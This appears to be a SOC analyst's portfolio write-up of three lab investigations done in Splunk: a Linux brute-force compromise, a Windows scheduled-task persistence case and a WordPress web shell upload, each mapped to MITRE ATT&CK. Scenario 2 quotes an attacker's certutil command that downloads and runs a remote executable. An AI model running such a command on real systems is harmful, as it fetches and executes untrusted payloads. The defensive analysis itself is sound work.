# Using Splunk to Triage Alerts and Investigate Malicious Activity

## Executive Summary
This portfolio documents my hands-on investigation of three distinct cyber-attack scenarios in a simulated Security Operations Centre (SOC) environment. Using Splunk as my primary tool, I successfully triaged and analysed alerts for a Linux brute-force attack, a Windows malicious scheduled task, and a web shell upload on a compromised server.

For each incident, I followed a methodical process to identify key indicators of compromise (IoCs), scope the impact, and map the attacker's actions to the MITRE ATT&CK framework. This work demonstrates my practical ability to perform essential Level 1 SOC analyst functions, from initial alert assessment to detailed forensic investigation and threat reporting.

## Alert Scenario #1: Linux Brute Force Attack

### Alert Details
*   **Alert Name:** Brute Force Activity Detection
*   **Time:** 17/09/2025 9:00:21 AM
*   **Target Host:** `tryhackme-2404`
*   **Source IP:** `10.10.242.248`

**Objective:** Investigate this activity and determine if it is suspicious.

### Tools & Technologies Used
*   **Splunk**

### Methodology & Findings
1.  **Initial Filtering:** I filtered the `auth.log` for events from the source IP to assess activity.
    ```splunk
    index="linux-alert" src_ip="10.10.242.248" action=failure OR action=success
    ```
    The results showed an anomalous volume of `Failed password` and `Accepted password` events for the user `john.smith`.

2.  **Quantifying the Attack:** I isolated attempts against `john.smith` to quantify the attack.
    ```splunk
    index="linux-alert" action=failure OR action=success user_name="john.smith" src_ip="10.10.242.248"
    ```
    *   **Finding:** `591 failed login attempts` occurred within a 5-minute window, followed by a successful `Accepted password` event from the same IP. This is a definitive indicator of a successful brute-force attack.

3.  **Visualisation & Further Investigation:** Using a pre-built query, I visualised all authentication activity from the suspicious IP to confirm the target user.
    *   **Privilege Escalation:** Searching activity by `john.smith` post-compromise revealed the attacker abused `sudo` to escalate privileges to `root`.
        ```splunk
        index="linux-alert" john.smith app=sudo
        ```
    *   **Persistence:** I discovered a persistence mechanism by searching for new user creation events, which revealed the attacker created a backdoor account named **`system-utm`**.
        ```splunk
        index="linux-alert" adduser
        ```

### MITRE ATT&CK Summary for Alert #1
*   **Initial Access (T1110):** Credential Access via Brute Force against user `john.smith`.
*   **Privilege Escalation (T1548):** Abused `sudo` to gain `root` privileges.
*   **Persistence (T1136):** Created a new user (`system-utm`) for persistent access.

### Conclusion
A successful brute-force attack led to full system compromise (root access) and the creation of a persistent backdoor account.

---

## Alert Scenario #2: Windows Malicious Scheduled Task

### Alert Details
*   **Alert Name:** Potential Task Scheduler Persistence Identified
*   **Time:** 30/08/2025 10:06:07 AM
*   **Host:** `WIN-H015`
*   **User:** `oliver.thompson`
*   **Task Name:** `AssessmentTaskOne`

**Objective:** Investigate the scheduled task creation and determine its intent.

### Tools & Technologies Used
*   **Splunk**

### Methodology & Findings
1.  **Identifying the Task:** I filtered logs for the specific task name using Windows Event ID `4698` (Scheduled Task Creation).
    ```splunk
    index="win-alert" "AssessmentTaskOne" EventCode=4698
    ```
    *   **Finding:** The task was configured to execute a malicious command daily:
        ```powershell
        "certutil.exe -urlcache -f http://tryhotme:9876/rv.exe C:\Users\OLIVER~1.THO\AppData\Local\Temp\3\DataCollector.exe; Start-Process C:\Users\OLIVER~1.THO\AppData\Local\Temp\3\DataCollector.exe"
        ```
        This uses `certutil.exe` (a living-off-the-land binary) to download (`-f`) and execute a remote payload.

2.  **Deeper Investigation:**
    *   **Process Creation:** Traced the task's parent process to `cmd.exe` executed by the user `WIN-H015\oliver.thompson`.
    *   **Reconnaissance:** Discovered the attacker enumerated the local **`Administrators`** group to map privileged accounts.
        ```splunk
        index="win-alert" "Group" Account_Name="oliver.thompson"
        ```
    *   **Lateral Movement Origin:** Identified that the initial logon to the compromised host (`WIN-H015`) originated from another workstation: **`DEV-QA-SERVER`**.
        ```splunk
        index="win-alert" host="WIN-H015" EventCode=4624
        ```

### MITRE ATT&CK Summary for Alert #2
*   **Persistence (T1053.005):** Created a malicious scheduled task (`AssessmentTaskOne`).
*   **Execution & Defense Evasion (T1059.003, T1105):** Used `cmd.exe` and `certutil.exe` to download/execute a payload.
*   **Discovery (T1069.002):** Enumerated the local "Administrators" group.
*   **Lateral Movement (T1570):** Initial access originated from `DEV-QA-SERVER`.

### Conclusion
An attacker with initial network access established persistence via a malicious scheduled task to download a payload and performed reconnaissance on local administrator groups.

---

## Alert Scenario #3: Web Shell Upload & Brute-Force

### Alert Details
*   **Alert Name:** Potential Web Shell Upload Detected
*   **Time:** 14/09/2025 09:31:51 AM
*   **Resource:** `http://web.trywinme.thm`
*   **Suspicious IP:** `171.251.232.40`

**Objective:** Investigate web server activity for signs of compromise.

### Tools & Technologies Used
*   **Splunk**
*   **Threat Intelligence:** AbuseIPDB, VirusTotal

### Methodology & Findings
1.  **Threat Intelligence Enrichment:** The source IP (`171.251.232.40`) was confirmed as malicious with over **12,500 community reports** on threat intelligence platforms, raising the alert's priority.

2.  **Web Shell Activity:** I queried web logs for activity from the malicious IP.
    ```splunk
    index=web-alert clientip="171.251.232.40" http://web.trywinme.thm
    ```
    *   **Finding:** The attacker uploaded and accessed a known, full-featured PHP web shell (`b374k.php`) via a compromised WordPress theme editor (`/wp-admin/theme-editor.php`).

3.  **Visualising the Attack Chain:** I tabled all activity from the malicious IP to see the full sequence.
    ```splunk
    index=web-alert 171.251.232.40 | table _time clientip useragent uri_path method status | sort + _time
    ```
    *   **Finding:** The attack began with a **brute-force attempt** against `/wp-login.php` using the tool **`Hydra`**, visible in the user agent.
    *   **Web Shell Execution:** Subsequent `POST` requests to `/wp-admin/admin-ajax.php` with the `b374k.php` referrer confirmed the attacker was actively issuing commands through the web shell.

### MITRE ATT&CK Summary for Alert #3
*   **Persistence (T1505.003):** Established a **Web Shell** (`b374k.php`) on the server.
*   **Execution (T1059):** Achieved command execution via the PHP web shell.
*   **Credential Access (T1110):** Attempted **Brute Force** on the WordPress login using Hydra.

### Conclusion
An attacker successfully uploaded a web shell to a web server, establishing persistent remote access. The attack was preceded by a brute-force attempt against administrative credentials. The malicious source IP was corroborated by external threat intelligence.

---

## Overall Takeaways
Investigating these three scenarios provided critical insights into real-world attack sequences and defensive analysis:

*   **Attackers Follow a Predictable "Kill Chain":** Each scenario illustrated clear progression (e.g., brute-force → privilege escalation → persistence). Recognizing these patterns allows an analyst to anticipate and hunt for related activity.
*   **Effective Triage Requires Correlation:** A comprehensive investigation depends on synthesizing information from different log types (authentication, process creation, web access). Correlating logs from `DEV-QA-SERVER` with those on `WIN-H015` was key to understanding the lateral movement in Alert #2.
*   **Threat Intelligence is a Force Multiplier:** Consulting external sources (AbuseIPDB, VirusTotal) to confirm the reputation of an IP transforms a suspicious event into a high-confidence alert, enabling faster, more decisive response.
*   **MITRE ATT&CK is the Essential Language for Reporting:** Mapping evidence to specific techniques (e.g., T1053.005, T1505.003) is crucial for clearly communicating the nature of the threat to both technical teams and management, ensuring a unified understanding of risk.
